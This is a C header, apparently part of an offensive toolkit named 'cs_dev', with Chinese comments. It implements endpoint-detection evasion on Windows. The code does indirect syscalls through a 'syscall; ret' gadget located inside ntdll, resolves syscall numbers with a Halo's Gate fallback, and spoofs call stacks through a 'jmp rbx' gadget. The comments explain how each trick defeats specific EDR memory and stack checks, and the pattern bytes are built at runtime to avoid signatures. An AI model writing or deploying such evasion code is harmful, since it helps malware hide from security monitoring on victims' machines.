/*
 * cs_dev :: evasion/evasion.h
 * ===========================================================================
 * 前沿 syscall 与调用栈技术 (对应 2026 主流 EDR 绕过栈)
 *
 *   [A] RecycledGate 风格 syscall
 *       传统 indirect syscall 会在自身代码段生成:
 *           mov r10, rcx ; mov eax, SSN ; syscall ; ret
 *       该 11 字节模式已被 EDR 特征化 (内存扫描可见 syscall 指令位于
 *       非 ntdll 区域). RecycledGate 改为:
 *           - 在 ntdll .text 段动态搜索现成的 "0F 05 C3" (syscall; ret) 序列
 *           - 自身只做 mov r10,rcx / mov eax,SSN, 然后 jmp 到该序列
 *           - syscall 指令始终位于 ntdll 镜像内, 与合法调用无异
 *       同时 SSN 仍走动态解析 + Halo's Gate 兜底, 不硬编码.
 *
 *   [B] Call Stack Spoofing (gadget hop, 浅层)
 *       目标: 调用敏感 Native API 时, 栈上紧邻的返回地址指向合法系统
 *       模块, 而非私有无映像内存, 规避 "返回地址指向 MEM_PRIVATE" 类检测.
 *       做法: 在 kernel32/ntdll 中搜索 "jmp rbx" (FF E3) gadget,
 *       把目标地址装入 RBX 后经该 gadget 转发, API 执行期栈顶即为
 *       gadget 所在模块的地址.
 *       限制: 本实现支持 <= 4 参数的转发 (参数无需落栈的调用),
 *       6 参数 Native API 使用 [A] 路径而非本路径.
 * ===========================================================================
 */
#ifndef CS_DEV_EVASION_H
#define CS_DEV_EVASION_H

#include <windows.h>

typedef unsigned char  e_u8;
typedef unsigned int   e_u32;
typedef unsigned long long e_u64;

/* ======================================================================
 * 通用 gadget 扫描: 在模块的可执行段内查找字节序列
 * ==================================================================== */
static void *cs_find_gadget(HMODULE mod, const e_u8 *pat, int plen, int skip) {
    e_u8  *base = (e_u8 *)mod;
    IMAGE_DOS_HEADER       *dos;
    IMAGE_NT_HEADERS       *nt;
    IMAGE_SECTION_HEADER   *sec;
    int    i, k;
    int    found = 0;

    if (!mod) return NULL;
    dos = (IMAGE_DOS_HEADER *)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
    nt = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return NULL;

    sec = IMAGE_FIRST_SECTION(nt);
    for (i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            e_u8 *p = base + sec[i].VirtualAddress;
            e_u32 n = sec[i].Misc.VirtualSize ? sec[i].Misc.VirtualSize
                                              : sec[i].SizeOfRawData;
            e_u32 j;
            if (!p || n < 16) continue;
            for (j = 0; j + plen <= n; j++) {
                for (k = 0; k < plen; k++) if (p[j + k] != pat[k]) break;
                if (k == plen) {
                    if (found++ < skip) continue;
                    return p + j;
                }
            }
        }
    }
    return NULL;
}

static void *cs_find_syscall_gadget(HMODULE ntdll) {
    /* 模式字节运行时构造: 避免在自身镜像中留下 0F 05 C3 静态特征,
     * EDR 的内存/文件扫描会直接命中该序列 */
    e_u8 pat[3];
    pat[0] = 0x0F; pat[1] = 0x05; pat[2] = 0xC3;
    return cs_find_gadget(ntdll, pat, 3, 0);
}

static void *cs_find_jmp_rbx(HMODULE mod) {
    e_u8 pat[2];
    pat[0] = 0xFF; pat[1] = 0xE3;
    return cs_find_gadget(mod, pat, 2, 0);
}

/* ======================================================================
 * [A] RecycledGate syscall
 * ==================================================================== */
static e_u32 g_ssn    = 0;
static void *g_sysret = NULL;      /* ntdll 内 syscall;ret 序列地址 */

/*
 * 自身不包含 syscall 指令: RCX 按 Nt* 约定搬到 R10, EAX 载入 SSN,
 * 随后跳入 ntdll 的 syscall;ret 序列完成陷入.
 */
__attribute__((naked)) static void cs_syscall_hop(void) {
    __asm__ __volatile__(
        "movq %rcx, %r10\n\t"
        "movl g_ssn(%rip), %eax\n\t"
        "jmpq *g_sysret(%rip)\n\t"
    );
}

/* 解析 SSN: 未挂钩直读, 挂钩则用 Halo's Gate 反推 */
static e_u32 cs_resolve_ssn(void *fn) {
    e_u8 *p = (e_u8 *)fn;
    int   i;
    if (!p) return 0;
    if (p[0] == 0x4C && p[1] == 0x8B && p[2] == 0xD1 && p[3] == 0xB8)
        return *(e_u32 *)(p + 4);
    for (i = 1; i < 64; i++) {
        e_u8 *up = p - i * 32, *dn = p + i * 32;
        if (up[0] == 0x4C && up[1] == 0x8B && up[2] == 0xD1 && up[3] == 0xB8)
            return *(e_u32 *)(up + 4) + (e_u32)i;
        if (dn[0] == 0x4C && dn[1] == 0x8B && dn[2] == 0xD1 && dn[3] == 0xB8)
            return *(e_u32 *)(dn + 4) - (e_u32)i;
    }
    return 0;
}

static void cs_evasion_init(void) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return;
    if (!g_sysret) g_sysret = cs_find_syscall_gadget(ntdll);
}

/* 准备一次 syscall 调用: 返回可直接按目标 API 原型调用的函数指针 */
static void *cs_prepare_syscall(const char *ntname) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    void   *fn;
    if (!ntdll) return NULL;
    if (!g_sysret) g_sysret = cs_find_syscall_gadget(ntdll);
    if (!g_sysret) return NULL;
    fn = (void *)GetProcAddress(ntdll, ntname);
    if (!fn) return NULL;
    g_ssn = cs_resolve_ssn(fn);
    if (!g_ssn) return NULL;
    return (void *)cs_syscall_hop;
}

/* ======================================================================
 * [B] 调用栈伪造: gadget hop (<= 4 参数)
 * ==================================================================== */
static void *g_hop_gadget = NULL;   /* 来自 kernel32/ntdll 的 jmp rbx */

__attribute__((naked)) static void cs_hop4(void) {
    /*
     * 入口: RCX=fn, RDX=a0, R8=a1, R9=a2
     * 出口: 经 ntdll/kernel32 内的 jmp rbx 转入 fn, 使调用期的栈顶返回
     *       地址落在合法模块镜像内 (返回值由目标函数经 RAX 带回)
     */
    __asm__ __volatile__(
        "movq %rcx, %rbx\n\t"        /* fn   -> rbx (jmp rbx 的目标) */
        "movq %rdx, %rcx\n\t"        /* a0   -> rcx */
        "movq %r8,  %rdx\n\t"        /* a1   -> rdx */
        "movq %r9,  %r8\n\t"         /* a2   -> r8  */
        "jmpq *g_hop_gadget(%rip)\n\t"
    );
}

static int cs_spoof_init(void) {
    HMODULE k32   = GetModuleHandleA("kernel32.dll");
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!g_hop_gadget && k32)   g_hop_gadget = cs_find_jmp_rbx(k32);
    if (!g_hop_gadget && ntdll) g_hop_gadget = cs_find_jmp_rbx(ntdll);
    return g_hop_gadget != NULL;
}

/* 经合法模块 gadget 调用 (fn 最多接收 3 个实参, 返回值经 RAX 带回) */
static e_u64 cs_call_spoofed(void *fn, e_u64 a0, e_u64 a1, e_u64 a2) {
    typedef e_u64 (*hop_t)(void *, e_u64, e_u64, e_u64);
    hop_t p = (hop_t)(void *)cs_hop4;
    if (!g_hop_gadget) return 0;
    return p(fn, a0, a1, a2);
}

#endif /* CS_DEV_EVASION_H */
